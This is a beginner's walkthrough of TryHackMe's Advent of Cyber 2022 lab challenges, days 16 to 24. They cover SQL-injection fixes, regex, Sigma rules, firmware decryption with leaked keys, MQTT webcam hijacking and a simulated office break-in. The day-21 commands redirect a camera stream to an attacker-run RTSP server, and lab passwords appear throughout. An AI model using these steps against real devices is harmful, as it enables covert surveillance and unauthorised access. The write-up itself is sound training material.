# [Advent of Cyber 2022](https://tryhackme.com/room/adventofcyber4)

> Get started with Cyber Security in 24 Days - learn the basics by doing a new, beginner-friendly security challenge every day leading up to Christmas.

## Day 16: SQLi’s the king, the carolers sing

login to the code editor web

![image](https://user-images.githubusercontent.com/90561566/208238951-5dbdf03c-8915-4e81-bc4b-c18344efb5fb.png)

firstly, fix the elf.php with intval() function at line 4 and line 17

![image](https://user-images.githubusercontent.com/90561566/208239213-fee36b8b-9de0-4ef6-9d02-c1014ff751c8.png)

secondly, change it to prepare statement at search-toys.php

![image](https://user-images.githubusercontent.com/90561566/208239364-612d190b-f283-4e73-b0a0-83ddfb738fd1.png)

fix the toy.php with intval() function at line 4 and line 30

![image](https://user-images.githubusercontent.com/90561566/208239598-1849c47a-1715-46fc-977f-05b2aab2a066.png)

last one, fix the login.php with prepare statement

![image](https://user-images.githubusercontent.com/90561566/208239914-4e34c1f6-d918-4597-8907-8937146b5a4a.png)

Answer

![image](https://user-images.githubusercontent.com/90561566/208239946-295dd51b-e96c-4f96-bb25-11587f6b278a.png)

## Day 17: Filtering for Order Amidst Chaos

this is a regex challenge, our job is filtering some words in that file

![image](https://user-images.githubusercontent.com/90561566/208287514-a910bd43-75c5-4ff1-bb0e-5d5f5bf9d422.png)

filter username

```
egrep '^[a-zA-Z0-9]{6,12}$' strings
```

![image](https://user-images.githubusercontent.com/90561566/208287658-f54fa92e-b091-48aa-9388-75b977da900c.png)

filter email

```
egrep '^.+@.+\.com$' strings
```

![image](https://user-images.githubusercontent.com/90561566/208287976-3bd87580-946a-4c11-b9b5-8be276abdbbf.png)

domain filter

```
egrep '^https?://(www.)?.+\..+' strings
```

![image](https://user-images.githubusercontent.com/90561566/208288210-710ff49a-a5f2-4ef2-a014-c3e159c7ea8e.png)

Answer

![image](https://user-images.githubusercontent.com/90561566/208288270-87343200-0de1-4b0b-8cdb-1d0629b75d78.png)

![image](https://user-images.githubusercontent.com/90561566/208288278-4f12f4e7-8a63-426e-adb4-9fe351f885f5.png)

## Day 18: Lumberjack Lenny Learns New Rules

they give us a website with sigma template and we must writeout the rule for it IOC

![image](https://user-images.githubusercontent.com/90561566/208444236-456d1554-8e71-4658-a7bc-dca135ebcf5b.png)

before starting, you need remember some identifying characteristics below

![image](https://user-images.githubusercontent.com/90561566/208446122-209c33a3-d125-45c0-a462-419d9486a2ff.png)

firstly, edit the local_account_creation.yml

![image](https://user-images.githubusercontent.com/90561566/208445533-85c00bc7-6ad1-42ef-b734-0a50280a6bbb.png)

after finished, click on view log, a detection log has been captured

![image](https://user-images.githubusercontent.com/90561566/208445932-72b74eed-9f0d-413c-9134-27f34a9ee8f8.png)

next, edit the susp_software_discovery.yml

![image](https://user-images.githubusercontent.com/90561566/208448128-64dba09b-735e-4cfd-ac40-9760d5ed359c.png)

finally, edit the schtasks_creation.yml

![image](https://user-images.githubusercontent.com/90561566/208449251-8a99201e-ae45-4633-9559-7514c697dbfe.png)

Answer

![image](https://user-images.githubusercontent.com/90561566/208449447-73528265-2ec1-451f-9911-69ec2c161566.png)

## Day 19: Wiggles go brrr

open the Logic 2.4.2 on Desktop with santa captured file to start analysis, ctrl and wheel your mouse to zoom out the signal

![image](https://user-images.githubusercontent.com/90561566/208622560-8f9e87a1-0289-4436-a21c-7d33ba934332.png)

zoom in at the first think line of D1 channel 1

![Untitled](https://user-images.githubusercontent.com/90561566/208624685-09c77009-0363-4823-9cb2-12a2c0647a91.png)

click on analyzer tab, choose async serial, let's analysis channel 1, Bit rate 4800

![Untitled](https://user-images.githubusercontent.com/90561566/208625727-29366b7f-3ef9-410d-b72c-41111662ebf7.png)

on the terminal icon, you can see the data

![image](https://user-images.githubusercontent.com/90561566/208626026-3762db2d-203b-44d7-9170-efbbfcb07471.png)

click on the plus and add another async serial, do the same with channel 0, Bit rate 4800

![image](https://user-images.githubusercontent.com/90561566/208626493-ccbf324b-9972-4962-9b30-7662bfacd833.png)

add another with channel 0 but Bit rate is 9600

![Untitled](https://user-images.githubusercontent.com/90561566/208627223-611b0760-b03b-4f93-ac8d-9228f8179a59.png)

Answer

![image](https://user-images.githubusercontent.com/90561566/208627725-07e91f41-6bdf-4951-a364-84c71c17227e.png)

![image](https://user-images.githubusercontent.com/90561566/208627752-9cf2c012-ce5a-47eb-abd8-0f6abc4ebbfd.png)

## Day 20: Binwalkin’ around the Christmas tree

log into machine, we have some files here

![image](https://user-images.githubusercontent.com/90561566/209087570-e780b3df-da9e-4734-8bcf-2d2a569dc5a5.png)

```
cd bin
binwalk -E -N firmwarev2.2-encrypted.gpg
```

verify the file, it is probably encrypted

![image](https://user-images.githubusercontent.com/90561566/209087811-2f688995-e541-4a02-8f95-0d78c31f1c8c.png)

extracted the firmware from older version

```
cd ../bin-unsigned
extract-firmware.sh firmwarev1.0-unsigned
```

![image](https://user-images.githubusercontent.com/90561566/209088275-60c138b5-ddc9-4ee2-99cc-51d2b5beb052.png)

now find encrypted key and paraphrase

```
grep -ir key
grep -ir paraphrase
```

![image](https://user-images.githubusercontent.com/90561566/209088560-b0c3a28e-8627-4d91-803f-d0615e09a39f.png)

remember paraphrase is `Santa@2022`, it will be used for protecting the key

import these keys to gpg

```
gpg --import fmk/rootfs/gpg/private.key
gpg --import fmk/rootfs/gpg/public.key
gpg --list-secret-keys
```

![image](https://user-images.githubusercontent.com/90561566/209089102-0fc31d44-fdbf-4e7d-88fd-90ff10e938aa.png)

```
cd ../bin
gpg firmwarev2.2-encrypted.gpg
```

![image](https://user-images.githubusercontent.com/90561566/209089518-5656ff88-cd43-4e82-9c19-778b0a6f6fa0.png)

now, extract the firmware

```
extract-firmware.sh firmwarev2.2-encrypted
```

![image](https://user-images.githubusercontent.com/90561566/209090012-06436624-5419-46d7-a076-4dc126ee6ad8.png)

we can find flag here

![image](https://user-images.githubusercontent.com/90561566/209090408-09d46149-3efe-448f-90ca-048691784c49.png)

search for build version

![image](https://user-images.githubusercontent.com/90561566/209091293-345828de-f62d-4373-9443-12bc45934ef8.png)

Answer

![image](https://user-images.githubusercontent.com/90561566/209091379-1321b113-5022-440d-b5e8-d0c748c6297b.png)

## Day 21: Have yourself a merry little webcam

scan the target

```
nmap -sV -sC -p1883 -T4 10.10.77.51
```

![image](https://user-images.githubusercontent.com/90561566/209133219-f48929fc-4f6b-4ebb-998d-da98a44db7d4.png)

we can see a lot of information has enumerated here

enumerate the device ID

```
mosquitto_sub -h 10.10.77.51 -t device/init
```

![image](https://user-images.githubusercontent.com/90561566/209133864-9f40cda3-9c2f-475f-8853-a50a1f16b702.png)

start an RTSP server

```
docker run --rm -it --network=host aler9/rtsp-simple-server
```

![image](https://user-images.githubusercontent.com/90561566/209135054-7b278899-f76c-498e-86bb-0d9c4a22ad33.png)

new tab and

```
mosquitto_pub -h 10.10.77.51 -t device/7CFHAWRYUZVN6PZFWCOI/cmd -m '{"CMD":"10","URL":"rtsp://10.10.93.62:8554/hello"}'
```

after get connected successful

```
vlc rtsp://127.0.0.1:8554/hello
```

Note the stream may take up to one minute to begin forwarding due to packet loss.

![image](https://user-images.githubusercontent.com/90561566/209141727-9dda9e3e-7d99-4dda-9eb7-f012899b6671.png)

Answer

![image](https://user-images.githubusercontent.com/90561566/209141975-73f789a1-22e1-4f01-bf46-cbc441d7dcc3.png)

## Day 22: Threats are failing all around me

match the information

![image](https://user-images.githubusercontent.com/90561566/209272347-78815c71-63fa-4dc3-b7f2-abe6825a88d3.png)

![image](https://user-images.githubusercontent.com/90561566/209272388-6ca3e5a4-2b31-43cf-8427-92475954ec16.png)

Answer

![image](https://user-images.githubusercontent.com/90561566/209272496-c33760a8-687c-4bd8-8017-d0a20c005ed4.png)

## Day 23: Mission ELFPossible: Abominable for a Day

we have a simulator game

![image](https://user-images.githubusercontent.com/90561566/209439444-c07539df-1ec6-4ca1-9556-93cddac5beb6.png)

first, talk to guard that you deliver for santa's EA

![image](https://user-images.githubusercontent.com/90561566/209439548-6f0c5a14-5d9b-49f6-8150-bf5e9652281e.png)

after that, go to santa executive assitant on the first right

![image](https://user-images.githubusercontent.com/90561566/209439693-d2f395a4-8ffc-4d92-bded-f57d26f3d52c.png)

click on the first desk drawer, there's a piece of paper wrote password of santa vault

![image](https://user-images.githubusercontent.com/90561566/209439649-8d5105c2-07bd-45ca-9c13-6296e44263de.png)

go to santa office at the right end of street, enter santa vault password

![image](https://user-images.githubusercontent.com/90561566/209439821-49c06050-2128-4b2b-8ec3-552b545c0b7f.png)

first flag solved

![image](https://user-images.githubusercontent.com/90561566/209439838-44ec46d7-c9ec-48d0-8fe9-e2e1da4fa115.png)

do the same to bypass guard, but now we have time limited

![image](https://user-images.githubusercontent.com/90561566/209439907-3f0b6777-5144-4f3b-b8ec-f7cb8e2df430.png)

this time there's a note in the cup on the right of EA's laptop

![image](https://user-images.githubusercontent.com/90561566/209439921-f5362733-1ca0-4af7-9aa3-1c0559d90151.png)

use it as password hint at santa office laptop

![image](https://user-images.githubusercontent.com/90561566/209439970-d10ba707-af40-476d-91f6-1e1984ff2c66.png)

we have santa vault's password again

![image](https://user-images.githubusercontent.com/90561566/209439975-2739d831-712d-4e13-8dd1-4580371c87ef.png)

next to level 3, now you have only 3 times to try and can acess only EA and deer rooms

![image](https://user-images.githubusercontent.com/90561566/209440109-f57999da-0ea8-4298-a55e-d9a45a8e845e.png)

see post-it note like at level 2

![image](https://user-images.githubusercontent.com/90561566/209440168-3b795186-b648-4ba3-88b0-55014dab7c25.png)

at drawer, we got santa card

![image](https://user-images.githubusercontent.com/90561566/209440577-f667ca20-b88f-494c-a3af-718bf2783304.png)

enter his favorite as password of his laptop, i found 2nd part of santa vault at file and his old password at trash

![image](https://user-images.githubusercontent.com/90561566/209440261-2309fac3-ccf5-42f9-840d-7d832b8aeb02.png)

try to change last digit of santa old password and we bypassed his laptop with `H0tCh0coL@t3_02` password, it constains 1st part of santa vault

![image](https://user-images.githubusercontent.com/90561566/209440846-69302655-1e2e-4464-bced-a9ff0a2b085f.png)

merge 2 parts and open santa vault, we have our flag and one santa code: 2845

![image](https://user-images.githubusercontent.com/90561566/209441013-7d2d4734-8cbf-4529-8dd4-1986c6d7424d.png)

go to santa workshop, enter PIN at the left of the door

![image](https://user-images.githubusercontent.com/90561566/209441111-88a454ab-b728-4ebf-852d-506ce29618d5.png)

Answer

![image](https://user-images.githubusercontent.com/90561566/209441236-2b809aa5-5574-4fe6-a7c1-152974b28d39.png)

![image](https://user-images.githubusercontent.com/90561566/209441249-c978f5de-e87c-467e-a51d-be88a4367e05.png)

![image](https://user-images.githubusercontent.com/90561566/209441255-1c47b3cc-3004-4585-adf3-9baf2a3bb25b.png)

## Day 24: Ho, ho, ho, the survey's short

do your feedback and get last flag

![image](https://user-images.githubusercontent.com/90561566/209441516-45432121-78a5-44b3-811b-42b6fd16baf5.png)
